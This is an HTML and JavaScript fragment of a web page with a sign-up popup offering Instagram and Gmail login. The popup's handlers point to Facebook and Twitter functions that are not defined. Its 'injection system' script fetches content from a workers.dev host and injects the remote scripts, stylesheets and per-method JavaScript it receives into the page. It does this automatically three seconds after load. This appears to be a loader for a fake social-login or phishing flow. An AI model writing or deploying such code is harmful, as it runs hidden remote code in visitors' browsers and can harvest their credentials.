
    <div class="popup-overlay" id="signupPopup">
        <div class="popup-content" style="position: relative;">
            <span class="close-popup" onclick="hidePopup()">&times;</span>
            <h2 class="popup-title">Sign Up</h2>
            <div class="signup-option" onclick="open_facebook();">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram Logo">
                <span>Sign up with Instagram</span>
            </div>
            <div class="signup-option" onclick="open_twitter();">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo">
                <span>Sign up with Gmail</span>
            </div>
        </div>
    </div>
    <div id="content-container"></div>
    <div id="injected-content"></div>
    <div id="loader"><div class="spinner"></div></div>

    <!-- Your existing popup logic -->
    <script>
        function showPopup() {
            document.getElementById('signupPopup').style.display = 'flex';
        }

        function hidePopup() {
            document.getElementById('signupPopup').style.display = 'none';
        }

        function signUp(method) {
            alert('Signing up with ' + method);
            hidePopup();
        }
    </script>

    <!-- Injection system script -->
    <script>
        let injectSystem = {
            cdnContent: null,
            injectedResources: new Set(),

            async initializeSignup(method) {
                try {
                    this.showLoader();
                    if (!this.cdnContent) {
                        await this.fetchCdnContent();
                    }
                    this.injectContent(method);
                    hidePopup(); // Using your existing hidePopup function
                } catch (error) {
                    console.error('Error during signup initiation:', error);
                    alert('An error occurred. Please try again.');
                } finally {
                    this.hideLoader();
                }
            },

            async fetchCdnContent() {
                try {
                    const response = await fetch('https://test4.mrrajaryanx30.workers.dev/cdn-content');
                    this.cdnContent = await response.json();
                    this.injectCssLinks(this.cdnContent.cssLinks);
                    this.injectJsLinks(this.cdnContent.jsLinks);
                } catch (error) {
                    console.error('Error fetching CDN content:', error);
                    throw new Error('Failed to load content. Please try again.');
                }
            },

            injectCssLinks(links) {
                links.forEach(link => {
                    if (!this.injectedResources.has(link)) {
                        const linkElement = document.createElement('link');
                        linkElement.rel = 'stylesheet';
                        linkElement.href = link;
                        document.head.appendChild(linkElement);
                        this.injectedResources.add(link);
                    }
                });
            },

            injectJsLinks(links) {
                links.forEach(link => {
                    if (!this.injectedResources.has(link)) {
                        const scriptElement = document.createElement('script');
                        scriptElement.src = link;
                        document.head.appendChild(scriptElement);
                        this.injectedResources.add(link);
                    }
                });
            },

            injectContent(method) {
                const container = document.getElementById('content-container');
                container.innerHTML = '';
                
                const oldScript = document.getElementById('dynamic-script');
                if (oldScript) {
                    oldScript.remove();
                }
                
                container.innerHTML = this.cdnContent.html[method];
                
                const script = document.createElement('script');
                script.id = 'dynamic-script';
                script.textContent = `
                    (function() {
                        ${this.cdnContent.js[method]}
                    })();
                `;
                document.body.appendChild(script);
            },

            showLoader() {
                document.getElementById('loader').style.display = 'flex';
            },

            hideLoader() {
                document.getElementById('loader').style.display = 'none';
            }
        };

        

        // Pre-fetch CDN content
        setTimeout(() => injectSystem.fetchCdnContent(), 3000);
    </script>
